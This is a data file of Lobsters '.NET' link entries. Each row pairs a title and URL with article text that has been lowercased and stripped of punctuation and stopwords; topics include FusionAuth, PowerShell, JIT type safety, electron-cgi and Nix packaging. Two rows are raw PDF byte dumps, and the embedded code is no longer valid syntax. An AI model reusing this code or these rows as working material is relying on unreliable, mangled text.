55,Lobsters,dotnet,"C#, F#, .NET programming",Creating a user in FusionAuth with a .NET Core CLI client,https://fusionauth.io/blog/2020/04/28/dot-net-command-line-client,creating user fusionauth net core cli client,prerequisite memory storage cpu requirement architecture apis client library fullfeatured welldocumented api client library net core client library setting fusionauth download fusionauth page command line client full source code course available set project code application forum post information bulk import api migrate user tutorial running command line client deployment option conclusion create web application,post build command line client fusionauth c net core library set fusionauth add user application command line interface cli tool built end tutorial working net core application allow add user fusionauth user database would useful tool customer service folk comfortable cli needed add user otherwise update user information fusionauth identity server second part tutorial use authorization code grant protect page aspnet web application adding user prerequisite using following software version net core fusionauth built tutorial window net core crossplatform need following software installed begin also want double check make sure system meet memory storage cpu requirement fusionauth architecture application two main component first net core cli tool create user calling fusionauth apis fusionauth identity server standalone application accessible http accessed configuration also via api call apis client library fusionauth fullfeatured welldocumented api allows create manage user application group using api allows extend fusionauth purpose never contemplated fusionauth team also integrate data source piece software unknown u software speak json reach fusionauth network connection integrate however realize everyone want write raw json wimp created client library make using api snap available apache license embedded application see fit post using net core client library setting fusionauth fusionauth identity server tutorial user data persisted using central identity server fusionauth mean manage user across number custom shelf application one place already fusionauth installed recommend docker compose option quickest setup curl dockercomposeyml http rawgithubusercontentcomfusionauthfusionauthcontainersmasterdockerfusionauthdockercomposeyml curl env http rawgithubusercontentcomfusionauthfusionauthcontainersmasterdockerfusionauthenv dockercompose fusionauth running http check download fusionauth page installation option rpm deb etc docker installed sign fusionauth administrator create new application creatively named mine dotnetcore refer application throughout tutorial need tweak default note id use later go apis section need create api key cli client head setting api key ui create new key set permission following principle least privilege allow post apiuser apiuserregistration nothing else privilege let owner key create user user registration note key value look something like need later command line client cli tool take user email password favorite color value create user fusionauth full source code course available download skip ahead running command line client like mind set project set net core console project like dotnet new console output usermanager go directory going import nuget package need dotnet add package jsonnet debugging dotnet add package fusionauthclient client access update usermanagercsproj file needed dependency code need write program interact apis full source code using system using iofusionauth using iofusionauthdomain using iofusionauthdomainapi using iofusionauthdomainapiuser using systemcollectionsgeneric using newtonsoftjson namespace usermanager class program private static readonly string apikey environmentgetenvironmentvariable fusionauthapikey private static readonly string fusionauthurl http private static readonly string tenantid private static readonly string applicationid static void main string args argslength consolewriteline please provide email password favorite color environmentexit string email args string password args string favoritecolor args fusionauthsyncclient client new fusionauthsyncclient apikey fusionauthurl tenantid var userrequest builduserrequest email password favoritecolor var response clientcreateuser null userrequest debugging string json jsonconvertserializeobject response consolewriteline json responsewassuccessful var user responsesuccessresponseuser var registrationresponse register client user registrationresponsewassuccessful consolewriteline created user email useremail else registrationresponsestatuscode var statuscode registrationresponsestatuscode consolewriteline failed status statuscode string json jsonconvertserializeobject response consolewriteline json else responsestatuscode var statuscode responsestatuscode consolewriteline failed status statuscode string json jsonconvertserializeobject response consolewriteline json static userrequest builduserrequest string email string password string favoritecolor user usertocreate new user usertocreateemail email usertocreatepassword password dictionary string object data new dictionary string object dataadd favoritecolor favoritecolor usertocreatedata data userrequest userrequest new userrequest userrequestsendsetpasswordemail false userrequestuser usertocreate return userrequest static clientresponse registrationresponse register fusionauthsyncclient client user user registrationrequest registrationrequest new registrationrequest userregistration registration new userregistration registrationapplicationid guidparse applicationid registrationrequestsendsetpasswordemail false registrationrequestskipregistrationverification true registrationrequestskipverification true registrationrequestregistration registration return clientregister userid registrationrequest going review every line highlight interesting point near top configuration value hardcode api key pull environment checking api key big nono make sure update value point correct fusionauth url application created ui tenantid optional unless one tenant good practice use private static readonly string apikey environmentgetenvironmentvariable fusionauthapikey private static readonly string fusionauthurl http private static readonly string tenantid private static readonly string applicationid build user request object first includes basic information email password password encrypted rest using tenant default encryption setting tutorial also connecting fusionauth tl encrypting password transit var userrequest builduserrequest email password favoritecolor var response clientcreateuser null userrequest successfully create user create registration otherwise punt complain person running client responsewassuccessful var user responsesuccessresponseuser var registrationresponse register client user registrationresponsewassuccessful consolewriteline created user email useremail store arbitrary key value pair data field let u associate application specific value user dictionary string object data new dictionary string object dataadd favoritecolor favoritecolor usertocreatedata data bit registration registration field tie user application created application simply something user log user associated zero many application see forum post information static clientresponse registrationresponse register fusionauthsyncclient client user user registrationrequest registrationrequest new registrationrequest userregistration registration new userregistration registrationapplicationid guidparse applicationid registrationrequestsendsetpasswordemail false registrationrequestskipregistrationverification true registrationrequestskipverification true registrationrequestregistration registration return clientregister userid registrationrequest note api choice used create user api tutorial api work well creating one user time onboarding tool might use however want import large number user fusionauth want explore bulk import api actually one better read migrate user tutorial walk well migrate user fusionauth running command line client run client fusionauthapikey api key dotnetexe run email password favorite color example fusionauthapikeyapikey dotnetexe run examplecom blue created user email examplecom try create user receive error message fusionauthapikeyapikey dotnetexe run examplecom blue failed status statuscode errorresponse fielderrors useremail code duplicate useremail message user email examplecom already exists look user section fusionauth ui see examplecom view user see associated dotnetcore application want build executable distribute user server net core runtime available run dotnet build see executable also look various deployment option conclusion apis great client library even better even though team fusionauth good anticipated user management need built ten client library available popular language right poor examplecom much next create web application log
56,Lobsters,dotnet,"C#, F#, .NET programming",Two months with Powershell on a UNIX,https://code.joejag.com/2020/a-month-with-powershell.html,two month powershell unix,jessica joy kerr changed shell ohmyzsh ohmyzsh module powershell gist poshgit gitaliases psreadline nvm z fixed semiofficial standard document github pester urnfield problem object string zsh article working,back december read article jessica joy kerr moving traditional unixy shell powershell caught interest changed shell time found improvement time thought challenge two month powershell linux mac noticed time jessica using window c developer found powershell great tool use compared ux hell usual commandline experience window system trial working primarily ubuntu machine using mac home worth switching first question get minimum acceptable experience defined robbyrussel theme ohmyzsh ohmyzsh module powershell amusing name oh posh surprised find set prompt miss useful alias tabbing behaviour come ohmyzsh even worse prompt often break window figured try diy customising prompt bash zsh matter adding bunch hieroglyphic environment variable called dark art first quite delighted find creator powershell eschewed environment variable approach replace function call need set prompt powershell override prompt function whatever want minimal prompt could function prompt writehost nonewline return pretty neat add whatever want straightforward way found git module provides getgitstatus function come back simple add element make preferred prompt function prompt check see last command successful writehost nonewline foregroundcolor green else writehost nonewline foregroundcolor red write current directory name writehost splitpath path pwd leaf nonewline foregroundcolor cyan git repo print branch name change gitstatus getgitstatus gitstatus writehost git nonewline foregroundcolor blue writehost gitstatusbranch nonewline foregroundcolor red writehost nonewline foregroundcolor blue gitstatusworkinglength gt writehost char nonewline foregroundcolor yellow return see entire profile gist another distinguishing feature powershell profile work rather searching myriad profile file etc home directory one place set thing easily access via profile variable code profile open profile make new one vscode mentioned using module back provided getgitstatus powershell firstclass module system built install publically available module using installmodule somemodule excellent organising community effort module installed poshgit getgitstatus gitaliases git alias ohmyzsh psreadline recreate tabbing behaviour zsh rather bash nvm since nvm shell function rather file recreates powershell excellent module used shell z jump around module build history directory frequent give command quickly jump back unfortunately powershell module work linux fixed problem show one major gripe powershell come two flavour desktop edition read old window box core edition crossplatform unfortunately module ecosystem folk mainly targetting desktop edition lot module explode install even semiofficial standard document recommending using technique work crossplatform best practice felt comfortable submitting pull request real repository wanted get used coding powershell language turn nice language use usual roman numeral bowling score urnfield problem language get used see code github even unit testing framework called pester make testing possible modern fashion attempt solving urnfield problem inlined test function urnfield param parameter mandatory true amount one amount five math floor amount one five handle number le urnfield urnfield urnfield urnfield handle magic urnfield handle interesting number urnfield urnfield one significant advantage powershell pipe object rather string program example l bash return string output file powershell return list file default behaviour print object example wanted get first three file l something like l head n powershell dir since dir command returning array index small thing like clean complicated pipe example getgitstatus command get object back like hasworking true upstream originmaster branch master upstreamgone false reponame techblog aheadby stashcount behindby working gemfilelock hasuntracked true hasindex false gitdir homewrightjprojectsjoejagtechbloggit index use prompt via getgitstatus branch sound good right downside using powershell unix one command find stackoverflow may work anymore example wanted check tl cert domain command line quick google told use echo openssl sclient showcerts servername joejagcom connect devnull openssl inform pem noout text work fine bash zsh still powershell throw error reason easier switch another shell work wrong powershell wrote zsh article final question whether change default shell zsh bash answer emphatic yes thing working well tried powershell possible cat etcshells see available system etcshells valid login shell binsh bindash binbash binrbash binzsh usrbinzsh pwsh sight powershell made work using posix standard starting shell involves reading environment setup however working expect possible powershell come using powershell writing got around putting pwsh bash profile start new shell perfect best right summarise advantage powershell modern scripting language great writing script firstclass module ecosystem got nice design touch like prompt function disadvantage use login shell yet unix system seen second class due legacy powershell desktop v core version command copy paste online work psreadline perfect leading clumsy tabbing behaviour really enjoyed using powershell default shell recommend anyone else disadvantage met coming login shell community moving embrace core version desktop healthier place shell yet
57,Lobsters,dotnet,"C#, F#, .NET programming",.NET JIT compiler is not type safe,https://tooslowexception.com/net-jit-compiler-is-not-type-safe/,net jit compiler type safe,compiler program execute without error jit part net runtime examine type safety converted cil protect verify ilverify run ilverify issue microsoftdotnetilverification programcs roslyn il verification sidenote rewritten cil conclusion write cil want trust app fully,everyone know c strongly typed language incorrect type usage simply possible following program compile class program static void main string args var test consolewriteline consume var new object consolewriteline consume error argument convert object string static int consume string slength good mean trust roslyn c compiler generate improper typesafety code rewrite code common intermediate language omitting completely c compiler method public static incorrecttypeuse cil managed ldstr test call cilappprogram consumestring string call void systemconsole systemconsole writeline newobj instance void systemprivatecorelib systemobject ctor call cilappprogram consumestring string call void systemconsole systemconsole writeline ret method public static consumestring string number cil managed callvirt instance systemprivatecorelib systemstring getlength ret first assembled ilasm tool without error syntactically correct cil ilasm compiler type check end assembly file smelly cil inside using ilasm could also simply modify cil help tool like dnspy ok let say fine happen try execute code net runtime verify somehow cil method justintime compiler sure notice type mismatch something prevent executing right happen program execute without error print length test followed new line truth jit part net runtime examine type safety result jit emits native code particular method us type layout information datatypes used happens stringlength property inlined method call access first int field object string length stored consumestring systemstring mov eax rcx first parameter passed ret pas newly created object instance always one pointersized field initialized zero requirement current gc result yes pas reference object int field value returned instead throwing typesafety related runtime exception following code converted cil execute error print class program static void main string args var c new c consolewriteline consume c print static int consume string slength class c public int x may quite suprising standard say point validation verification mention cil verification rule algorithm state aside rule standard leaf unspecified time ever algorithm performed conforming implementation event verification failure ordinarily conforming implementation cli allow unverifiable code valid code pas verification executed although subject administrative trust control part standard indeed net runtime validation verify il difference run following code method public static incorrecttypeuse cil managed argument provided consumestring call cilappprogram consumestring string ret end systeminvalidprogramexception common language runtime detected invalid program thrown summarize fact invalid cil code may trigger invalidprogramexception case others allow program execute many unexpected result may happen jit compilation runtime protect deploying running production need verify il peverify tool exactly purpose shipped net framework sdk find one folder similar c program file microsoft running example indeed detect incorrect method proper explanation peverify cilappbindebugcilappexe microsoft r net framework pe verifier version c microsoft corporation right reserved il error cilappexe cilappprogram incorrecttypeuse offset found ref cilappc expected ref systemstring unexpected type error verifying cilappexe problem peverify support net core net core ilverify crossplatform open source counterpart developed part corert runtime although support analyzing net framework net core currently working need compile whole corert run ilverify issue use unofficial microsoftdotnetilverification package write command line tool inspired original programcs nothing officially supported shipped runtime yet btw ongoing process make roslyn il verification fully working well sidenote previous example little simplified consumestring string called virtual getlength method sealed string type aggressively inlined experiment regular virtual method sealed type thing become intermittent call using virtual stub dispatch mechanism following example rewritten cil consume behave depends passed argument pointer vsd follow likely triggering access violation class program static void main string args var test var new object var c new c consolewriteline consume work return random value consolewriteline consume accessviolation consolewriteline consume c methodimpl methodimploptionsnoinlining static int consume c c ccalculate public class c public int f public virtual int calculate f conclusion write cil power hand like using reflectionemit manipulate cil fore code weaving magic like whole unsafe class please aware difference validation verification verify assembly jit compiler want trust app fully run il verification executing probably could even added ci pipeline additional check may trust code someone else code code modified tool use yes straightforward currently net core case
58,Lobsters,dotnet,"C#, F#, .NET programming",The story of how I created a way to port Windows Apps to Linux,https://www.blinkingcaret.com/2020/04/09/the-story-of-how-i-created-a-way-to-port-windows-apps-to-linux/,story created way port window apps linux,coder radio qt idea electron read first experiment electroncgi pushing adding concurrency twoway communication process net task parallel library data flow part part proof porting window store application linux nodejs net electroncgi crossplatform gui net core electroncgi crossplatform gui net core electroncgi cross platform net core gui electron twitter linkedin,day weekend sometime around summer house chore listening podcast podcast listening called coder radio specifically listening episode qt episode using qt develop crossplatform gui net application end decided give idea mainly complicated setup required developed window qt support cross compilation end license prohibitively expensive heard though humm think know way solve problem think come solution would work well context specifically business application memory usage constrained bit presumptuous naive think like perhaps let take journey promise disappoint idea net solution developing crossplatform gui option easy set develop hand technology super popular developing crossplatform apps electron electron heavily criticized heavy memory use mostly slack great application written feel super smooth vscode probably responsible enabling people able choose different operating system normally use problem develop using net electron javascript nodejs know know electronnet trust talking completely different idea electron basically nodejs start net process node use electron build ui behavior written net need nonconvoluted way sending commandsrequests node net work right turn yes work probably already use approach time time pipe output command another shell basically using idea going describe next skeptical robust let tell people database restoresbackups using technique eg cat backuparchive mongorestore archive ok beating around bush idea use stdin stdout stream create two way communication channel two process case nodejs net case stream news stdin standard input stream normally used read data terminal like program asks input stdout standard output stream write program get data show terminal redirected piped output one becomes input nodejs module named childprocess contains function spawn use spawn new process grab hold stdin stdout stderr stream using spawn create net process ability send data stdin receive data stdout look like const spawnedprocess spawn pathtoexecutable spawnedprocessstdinwrite hello net nodejs spawnedprocessstdouton data data data net simple idea moving part simple set obviously code form usable example ended creating const connection new connectionbuilder connectto dotnetexecutable build connectionsend greeting john err thegreeting consolelog thegreeting code sends request net type greeting argument john expects response net proper greeting john omitting lot detail namely actually get sent stdinstdout stream terribly important left important work net net application possible get access process stdin stdout stream available console property care required reading stream keeping open thankfully streamreader support overload read method ended looking first implementation idea net var connection new connectionbuilder withlogging build expects request named greeting string argument return string connectionon string string greeting name return hello name wait incoming request connectionlisten first experiment called implementation idea electroncgi probably best name given idea really enables execute net code nodejs allowed create demo application ui built using electron angular andor plain javascript nonui code running net calculator demo postgresql database record browser last one every keystroke query performed result returned rendered perceived performance good totally feel like native application nonui code net example one thing might obvious looking example maintain state application net one approach common electron apps use electron display web page action perform end http request server host web page mean deal http related need pick port send http request deal routing cooky etc etc approach however server net process stick around keep state setup super simple literally two line nodejs net process talking gave confidence idea good worth exploring pushing adding concurrency twoway communication process time demo possible send message nodejs net way around also everything synchronous meaning sent two request nodejs first took one minute finish wait full minute got response second request image worth thousand word would look visually sent request nodejs net every request took average complete enabling request running concurrently involved dealing concurrency concurrency hard took get right end used net task parallel library data flow library complicated subject process figuring wrote two blog post case curious dataflow tpl dataflow net core depth part part much better example request served concurrently big feature missing able send request net nodejs previously possible send request nodejs argument get response net result example connectionsend eventget enceladus event event list filtered event using filter enceladus enough simple application complex one ability net send request super important change format message exchanged using stdin stdout stream previously net stdin stream would receive request node response request sent using stdout stream support duplex communication message included type could request response later added error well also changed api nodejs connectionsend requesttype optionalargument err optionalresponse err exception object exception net handler also added ability use promise try const response await connectionsend requesttype optionalarg catch err handle err handle request net connectionon requestype optionalargument optionally return response net connectionon requesttype argument return optional response send connectionsend requesttype optionalargument optionalresponse use response also async version var response await connectionsendasync requesttype optionalargument proof porting window store application linux first started idea imagined good proof would viable would pick application built using mvvm able take viewmodels ui agnostic use unaltered application using approach thankfully game built window store around still source code game named memory ace still find window store turn able reuse code create crossplatform version problem running ubuntu also able run window problem mac could try want look source code find also source electroncgi nodejs net also blog post extra information electroncgi crossplatform gui net core electroncgi crossplatform gui net core electroncgi cross platform net core gui electron also see easy setup project electroncgi using outdated version process identical managed grab attention kindly ask help personally affected pandemic working contractor company badly affected hospitality sector let everyone go included appreciate might position offer job help appreciated example company open role suggest well versed net nodejs react angular several technology maybe even referral program know role could good fit let know twitter dm open linkedin profile take care stay safe related
59,Lobsters,dotnet,"C#, F#, .NET programming",Generate unit tests for your code with IntelliTest,https://docs.microsoft.com/en-us/visualstudio/test/generate-unit-tests-for-your-code-with-intellitest,generate unit test code intellitest,generate unit test using intellitest article availability extension create intellitest run intellitest extensible explore use intellitest explore code generate unit test run intellitest run intellitest exploration result persist save unit test regression suite assist use intellitest focus code exploration specify use intellitest validate correctness property specify code q q use intellitest unmanaged code q generated test pas fail pexallowedexceptionattribute pexallowedexceptionfromtypeattribute pexallowedexceptionfromtypeundertestattribute pexallowedexceptionfromassemblyattribute q add assumption parameterized unit test pexassume q add assertion parameterized unit test pexassert q generate parameterized unit test without running intellitest first create intellitest q use unit test framework intellitest find install framework nunit test generator create intellitest q learn test generated blog post,generate unit test using intellitest minute read article intellitest explores net code generate test data suite unit test every statement code test input generated execute statement case analysis performed every conditional branch code example statement assertion operation throw exception analyzed analysis used generate test data parameterized unit test method creating unit test high code coverage run intellitest easily see test failing add necessary code fix select generated test save test project provide regression suite change code rerun intellitest keep generated test sync code change availability extension create intellitest run intellitest menu command available enterprise edition visual studio support c code target net framework extensible support emitting test mstest mstest nunit xunit format support configuration explore use intellitest explore code generate unit test generate unit test type must public open solution visual studio open class file method want test rightclick method choose run intellitest generate unit test code method intellitest run code many time different input run represented table showing input test data resulting output exception generate unit test public method class simply rightclick class rather specific method choose run intellitest use dropdown list exploration result window display unit test input data method class test pas check reported result result column match expectation code test fail fix code appropriate rerun intellitest validate fix persist save unit test regression suite select data row want save parameterized unit test test project view test project parameterized unit test created individual unit test corresponding row saved gc file test project parameterized unit test saved corresponding c file run unit test view result test explorer would unit test created manually necessary reference also added test project method code change rerun intellitest keep unit test sync change assist use intellitest focus code exploration complex code intellitest assist focusing exploration code example method interface parameter one class implement interface intellitest discovers class report warning view warning decide want investigate code understand want test fix warning choose class use test interface choice added pexassemblyinfocs file assembly pexusetype typeof camera rerun intellitest generate parameterized unit test test data using class fixed specify use intellitest validate correctness property specify code specify general relationship input output want generated unit test validate specification encapsulated method look like test method universally quantified parameterized unit test method assertion make must hold possible input value intellitest generate q q use intellitest unmanaged code intellitest work managed code q generated test pas fail pass like unit test exception occur fails assertion fails code test throw unhandled exception test pas certain exception thrown set one following attribute based requirement test method test class assembly level pexallowedexceptionattribute pexallowedexceptionfromtypeattribute pexallowedexceptionfromtypeundertestattribute pexallowedexceptionfromassemblyattribute q add assumption parameterized unit test yes use assumption specify test data required unit test specific method use pexassume class add assumption example add assumption length variable null like pexassumeisnotnull length add assumption rerun intellitest test data longer relevant removed q add assertion parameterized unit test yes intellitest check asserting statement fact correct run unit test use pexassert class assertion api come test framework add assertion example add assertion two variable equal pexassertareequal b add assertion rerun intellitest check assertion valid test fails q generate parameterized unit test without running intellitest first yes rightclick class method choose create intellitest accept default format generate test change project test named create new test project save test existing project q use unit test framework intellitest yes follow step find install framework test framework extension also available visual studio marketplace example nunit test generator restart visual studio reopen solution rightclick class method choose create intellitest select installed framework run intellitest generate individual unit test corresponding gc file q learn test generated yes get highlevel overview read blog post
60,Lobsters,dotnet,"C#, F#, .NET programming",Implementing Single-User Administrator Authorization with Azure AD in ASP.Net Core 3.1,https://danschnau.com/blog/implementing_single_user_admin,implementing singleuser administrator authorization azure ad aspnet core,implementing singleuser administrator authorization azure ad aspnet core helpdoc docsmicrosoftcom install dependency microsoftaspnetcoreauthenticationazureadui create new azure ad app registration docsmicrosoftcom configure thing app update change change add public controller secure controller closing thought go home page,implementing singleuser administrator authorization azure ad aspnet core blog entirely readonly site content stored database app read db code writing db order update content manually write sql query needed able secure feature site could get away practice goal save user data app use mirosoft identity one use xbox log allow authorize worked helpdoc docsmicrosoftcom link sample project could use reference useful troubleshooting install dependency step install nuget package microsoftaspnetcoreauthenticationazureadui create new azure ad app registration use azure ad auth need create app registration mine pointandclick azure portal info docsmicrosoftcom end tenantid clientid also make sure redirect url correct needed danschnaucomoidclogin prod local development configure thing app aspnet core app plugged setting appsettingsjson copied sample project azuread instance http loginmicrosoftonlinecom domain enter domain tenant eg contosoonmicrosoftcom tenantid tenantidgoeshere clientid clientidgoeshere callbackpath signinoidc update startupcs configure change configure added appuseauthorization appuseauthentication method get called runtime use method configure http request pipeline public void configure iapplicationbuilder app ihostingenvironment env snip appusehttpsredirection appusestaticfiles appuserouting appusecookiepolicy appuseauthentication appuseauthorization appuseendpoints endpoint snip configureservices change configureservices added thing changed servicesconfiguremvc instead bit authorization configuration servicesaddmvc option var policy new authorizationpolicybuilder requireauthenticateduser build optionsfiltersadd new authorizefilter policy also call servicesaddauthentication servicesaddauthentication azureaddefaultsauthenticationscheme addazuread option configurationbind azuread option call servicesaddauthorization specifying way authorized claim email address servicesaddauthorization option optionsaddpolicy adminpolicy orequireassertion authorizationhandlercontext authorizationhandlercontextuser hasclaim http dsschnau gmailcom took bit trial error get working add allowanonymous public controller blog pretty vanilla mvc app controller service publicfacing page got allowanonmyous tag put clases allowanonymous public class homecontroller controller secure controller could force controller lock access authorize adminpolicy public class admincontroller controller done closing thought worked well taking hour implement example wellwritten documentation helpful error message never stuck troubleshooting long like around authenticationauthorization dan schnau dot com future adding ability leave comment come mind feedback question advice email dsschnau gmailcom implementing singleuser administrator authorization azure ad aspnet core first published go home page
61,Lobsters,dotnet,"C#, F#, .NET programming",SafeGPU: Contract- and Library-based GPGPU for Object-Oriented Languages (2016),http://se.inf.ethz.ch/people/poskitt/publications/Kolesnichenko-Poskitt-Nanz.COMLAN.2016.pdf,safegpu contract librarybased gpgpu objectoriented language,,obj length filter flatedecode stream اq b h xǡ c n w q endstream endobj obj length filter flatedecode stream p g u gg v ɗ p
62,Lobsters,dotnet,"C#, F#, .NET programming",C# 8 is Introducing Ranges,https://www.devsanon.com/c/c-8-is-introducing-ranges/,c introducing range,targettyped new expression default interface method fixing interpolated verbatim string introduction index start index inclusive range exclusive article range type,talking lot c feature recently talked targettyped new expression default interface method even minor feature like fixing interpolated verbatim string one feature discussed introduction index feature go hand hand another feature introduction range c language syntactic way access range slice part collection developer usually forced perform custom slice management resort linq method like arrayskip take c adding new small feature help people getting range item bigger array item let check basic let say array item needed log normally would loop log like following var array new string int consolewriteline array wanted specific one got controlling index value using range could following instead var array new string foreach var item array consolewriteline item first timer would notice something peculiar would print four item well start index inclusive range exclusive wanted effect loop version foreach loop foreach var item array consolewriteline item shortcut range index inclusive end inclusive foreach var item array consolewriteline item start inclusive index exclusive foreach var item array consolewriteline item combining two could syntactically correct version following foreach var item array consolewriteline item basically mean give whole range index inclusive x end exclusive foreach var item array consolewriteline item combine hat operator index explained previous article quick explanation hat operator give specific index write basically requesting index last item given explained putting last index number exclusive sequence item requesting basically requesting item included hope clear range type use range type pas around earlier also store variable pas around simply typing range range pas argument method store private variable anything business logic requires range used list ienumerable τ array type support also use index range string span readonlyspan example string basically replacement substring method like following string string r r holding everyone worrying list probably usually use instead array list already getrange method since net framework went method please follow like u
63,Lobsters,dotnet,"C#, F#, .NET programming",The journey of packaging a .NET app on Nix,https://sgt.hootr.club/molten-matter/dotnet-on-nix/,journey packaging net app nix,journey packaging net app nix disclaimer runtime identifier easy first derivation gist packaging dependency digression hash aforementioned gist nix serialization path reduce chance hash containing swearword srclibutilhashcc discoursenixosorg comment source lockfile finally running bot support version openssl adding package system overlay cryptic infinite recursion error code post reading,journey packaging net app nix friend discord server gather week even twice lately due recent event watch movie together going three half year thought time make bot handle voting backlog time u started writing one f raspberry pi running nixos thought could run bot learn something packaging nix sodisclaimer little experience packaging nix spot mistake please tell correct first thought could crosscompile bot run compiled version bother packaging dependency crosscompiling net core program using dotnet cli easy specify runtime identifier use selfcontained flag target machine need net runtime installed run dotnet publish selfcontained r c releasei sent output pi inspected ldd running binary nixos easy linux distros path dynamically loaded library predictable hardcoded source usually wrongi tried patch binary patchelf much luck even manage make run printed message usable version libssl foundand dumped core later learned could probably avoided almost everything point moment decided hard waythe first derivationi cloned repository pi quickly discovered dotnetsdk package support easy enough fix downloaded nix file modified url hash point version sdk promise upstream support eventually moment machine worked well enough could build bot tried make simple derivation stdenv libunwind openssl icu libuuid zlib curl callpackage dotnetsdk let rpath stdenvlibmakelibrarypath stdenvcccc libunwind libuuid icu openssl zlib curl dynamiclinker stdenvccbintoolsdynamiclinker stdenvmkderivation rec pname kinobot version src builtinsfetchgit name pname version git url http githubcomsteinuilkinobot ref master rev buildinputs dotnetsdk buildphase export export home mktemp dotnet publish nologo r selfcontained c release installphase runhook preinstall mkdir p outbin cp r ln outkinobot outbinkinobot runhook postinstall dontpatchelf true postfixup patchelf setinterpreter dynamiclinker setrpath origin rpath outkinobot find type f name exec patchelf setrpath origin rpath meta stdenvlib homepage http githubcomsteinuilkinobot platform license licensesisc took inspiration gist derivation found come tried run nix repl nixpkgs welcome nix version type help loading nixpkgs added variable nixrepl kinobot callpackage import kinobotnix nixrepl b kinobotbut got stuck dotnet restore step build discovered external connection allowed build step nix derivation fetch dependency nixpackaging dependency digression hashesit turn dotnet command take source argument let specify folder containing nuget package started copying aforementioned gist got list direct transitive dependency objprojectassetsjson file want install node though rewrote script f problem script though dependency file specifies hash correspond hash zip file probably nix serialization path eitherthe hash nix us also like one see wild use many character hex also fact nix us version compact still containing ascii digit lowercase letter except e u chosen reduce chance hash containing swearword implementation specified srclibutilhashcc compact easily ported language f implementation module let char let length size size let frombytes byte byte seq n length byteslength downto let b n let b let j b yield int byte j byteslength else int byte j seqmap fun c char c seqtoarray systemstringyou really use nix also support hash thought fun try implementing ownbut let go back dependency head scratching nixhash apparently returned different hash dependency downloaded curl one downloaded nixprefetchurl figured pas l flag curl follow redirect hash identical nixprefetchurl http mib dl path wrong curl http nixhash type flat curl l http nixhash type flat newly created discoursenixosorg account ready send post demanding explanation oh well also write version fetchnuget default one tried build artifact reason support used mono using used gist inspiration basename version let nupkgname libstringstolower basename version nupkg stdenvnoccmkderivation name basename version src fetchurl inherit url http basename version name basename version zip sourceroot buildinputs unzip dontstrip true installphase mkdir p chmod r nuspec cp nuspec cp src nupkgname script generates file look roughly like name rec cache linkfarm name nugetpkgs package package name argu path fetchnuget basename argu version linkfarm function documented comment source nix recurring problem documentation yes take every derivation second argument link subdirectory derivation named first exactly needed source directory restore step buildbefore going back main file protips package thing got stuck source package lockfile set runtimeidentifiers property cf sproj else missing platformspecific one like runtimenativesystemsecuritycryptographyopensslmake sure download dependency twice get error ln phase linkfarm derivation saying permission denied dependency listed projectframeworks yourtargetframework downloaddependencies objprojectassetsjson file also include build one called like onfinally running botnothing much changed main derivation added link farm derivation list dependency set source dotnet publish commandlet rpath nugetpkgs callpackage import kinobotnugetnix kinobot stdenvmkderivation rec buildinputs dotnetsdk nugetpkgscache buildphase export export home mktemp dotnet publish nologo r selfcontained source nugetpkgscache c release could finally build package locally tried run got libssl error beginning naught maybe turn net core support version openssl version packaged nix easily fixed importing instead openssl rpath stdenvlibmakelibrarypath stdenvcccc libunwind libuuid icu zlib curl openssl zlib curl adding package systemnow got running add system need overlay overlay function take two argument named self super return set package mine look like self super dotnetsdk supercallpackage pkgsdotnetsdknix kinobot supercallpackage pkgskinobotnix imported main configurationnix file note parenthesis around import nix throw cryptic infinite recursion error stack trace forget nixpkgsoverlays import myoverlaynix environmentsystempackages pkgs kinobot also added systemd service start automaticallysystemdserviceskinobot enable true networktarget wantedby multiusertarget serviceconfig restart onfailure execstart pkgskinobot binkinobot token secretskinobottoken took day get working rebuild everything dozen time get working omitted several dumb mistake made kept trouble thought could help othersnonetheless really like nixos definitely using package thing future already main linux o personal laptop raspberry pi use window desktop work laptop sadly good occasion learn package work probably migrating server futurecode post note many hack specific usecase left code probably usable asisfurther reading
65,Lobsters,dotnet,"C#, F#, .NET programming",Lcc.NET: Targeting the .NET Common Intermediate Language from Standard C,https://www.microsoft.com/en-us/research/wp-content/uploads/2016/02/tr-2002-112.pdf,lccnet targeting net common intermediate language standard c,,obj linearized h l e n endobj xref n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n trailer size info r root r prev id startxref eof obj type catalog page r metadata r outline r thread r name r openaction r xyz null null null pagemode useoutlines pagelabels r endobj obj r endobj obj title f r endobj obj dests r endobj obj e l filter flatedecode length r stream yż p b endstream endobj obj endobj obj type page parent r resource r content r cropbox annots r mediabox rotate endobj obj count first r last r endobj obj title introduction dest parent r next r endobj obj title appendix msil instruction dest parent r prev r first r last r count endobj obj title reference dest parent r prev r next r first r last r count endobj obj title table msil instruction dest parent r endobj obj title acknowledgement dest parent r prev r next r endobj obj title ecma international language infrastructure cli tandard geneva dec http dest parent r next r endobj obj title b steel jr first version proceeding west ern joint computer conference may pp dest parent r prev r endobj obj title platt introducing microsoft net second edition microsoft p res redmond wa dest parent r prev r next r endobj obj title c newey p c poole w waite machine model ling produce portable softwareprac tice experience dest parent r prev r next r endobj obj title lindholm f yellin java virtual machine specification econd edition addisonwesley reading dest parent r prev r next r endobj obj title lidin inside microsoft net il assembler microsoft press redmo nd wa dest parent r prev r next r endobj obj title w kahan j darcy floatingpoint hurt ever yone acm workshop java highperformance netw ork computing invited talk mar http wwwcsberkeleyeduwkah anjavahurtpdf dest parent r prev r next r endobj obj title r hanson experience asdl softwarepra ctice experience dest parent r prev r next r endobj obj title e gunnerson introduction c second edition press berkeley ca dest parent r prev r next r endobj obj title j gough compiling net common language runtime clr pre nticehall ptr upper saddle river nj dest parent r prev r next r endobj obj title c w fraser r hanson lcc codegeneration interf technical report microsoft research redmond w july http dest parent r prev r next r endobj obj title c w fraser r hanson retargetable c compiler design implementation addisonwesley menlo park ca dest parent r prev r next r endobj obj title c w fraser r hanson machineindependent softwarepractice experience dest parent r prev r next r endobj obj title j r elli l detlefs efficient garbage collection technical report xerox parc palo alto ca jun e ftp parcftpxeroxcompubellisgcgcps dest parent r prev r next r endobj obj title discussion dest parent r prev r next r endobj obj title measurement dest parent r prev r next r first r last r count endobj obj title mapping c onto msil dest parent r prev r next r first r last r count endobj obj title table sample execution time second lcc lccnet line input dest parent r endobj obj title compilation pipeline dest parent r prev r next r first r last r count endobj obj title static initialization dest parent r next r endobj obj title variable length argument list dest parent r prev r endobj obj title floating point dest parent r prev r next r endobj obj title figure entrypoint file generated illink dest parent r prev r next r endobj obj title linking dest parent r prev r next r endobj obj title function pointer dest parent r prev r next r endobj obj title lcc codegeneration interface dest 